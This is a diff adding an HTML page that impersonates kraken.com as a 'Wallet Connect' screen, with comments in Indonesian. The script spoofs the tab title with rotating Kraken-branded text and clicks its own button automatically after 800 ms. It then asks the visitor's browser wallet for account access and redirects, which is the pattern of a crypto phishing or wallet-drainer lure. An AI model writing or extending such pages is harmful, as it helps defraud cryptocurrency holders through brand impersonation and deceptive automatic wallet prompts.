@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>kraken.com - Wallet Connect</title>
+  <style>
+    body, html { margin:0; padding:0; height:100%; background:#0a1a2a; color:#e0f7fa; font-family:system-ui; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; }
+    .kraken { font-weight:900; font-size:32px; color:#00c853; margin-bottom:16px; }
+    .msg { font-size:18px; color:#80deea; margin:12px 0; }
+    .img-btn { cursor:pointer; width:120px; height:120px; border-radius:50%; box-shadow:0 8px 32px rgba(0,200,83,0.4); transition:transform 0.2s; }
+    .img-btn:hover { transform:scale(1.1); }
+    .loader { width:40px; height:40px; border:4px solid #1a3a5c; border-top:4px solid #00c853; border-radius:50%; animation:spin 1s infinite linear; margin:20px auto; display:none; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="kraken">KRAKEN</div>
+  <h2>Connect Your Wallet</h2>
+  <p class="msg">Click the icon to securely connect</p>
+
+  <!-- GAMBAR SEBAGAI TOMBOL -->
+  <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDEyMCAxMjAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNjAiIGN5PSI2MCIgcj0iNTUiIGZpbGw9IiMwMGM4NTMiLz48cGF0aCBkPSJNNjAgNDBMMzAgNzBsMzAgMzB6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==" 
+       alt="Connect" 
+       class="img-btn" 
+       id="connectImg">
+
+  <div class="loader" id="loader"></div>
+  <p class="msg" id="status"></p>
+
+  <script>
+    // === LOGIC: KLIK GAMBAR → AUTO CONNECT + REDIRECT ===
+    const imgBtn = document.getElementById('connectImg');
+    const loader = document.getElementById('loader');
+    const status = document.getElementById('status');
+
+    // Spoof title
+    let i = 0;
+    const titles = ["kraken.com - Connecting...", "kraken.com - Wallet Connected", "kraken.com - Syncing..."];
+    setInterval(() => { document.title = titles[i % 3]; i++; }, 1000);
+
+    // Event: Klik gambar
+    imgBtn.addEventListener('click', async (ev) => {
+      console.log('[UI] Manual image button clicked!');
+      loader.style.display = 'block';
+      status.textContent = 'Connecting...';
+
+      // 1. Redirect ke kraken.com di tab baru
+      window.location.href = "https://apple.com/"; // BISA GANTI ke a href + click()
+
+      // 2. Auto connect wallet
+      (async function showAccounts() {
+        if (!window.ethereum) {
+          status.textContent = 'No wallet detected!';
+          return;
+        }
+
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          console.log('[init] accounts:', accounts);
+          status.textContent = `Connected: ${accounts[0].slice(0,6)}...${accounts[0].slice(-4)}`;
+          document.title = "kraken.com - Wallet Connected";
+        } catch (e) {
+          console.log('[init] err reading accounts', e?.message);
+          status.textContent = 'Connection failed';
+        }
+      })();
+    });
+
+    // === BONUS: AUTO TRIGGER TANPA KLIK (setTimeout) ===
+    setTimeout(() => {
+      imgBtn.click(); // Auto klik gambar
+    }, 800);
+  </script>
+</body>
+</html>
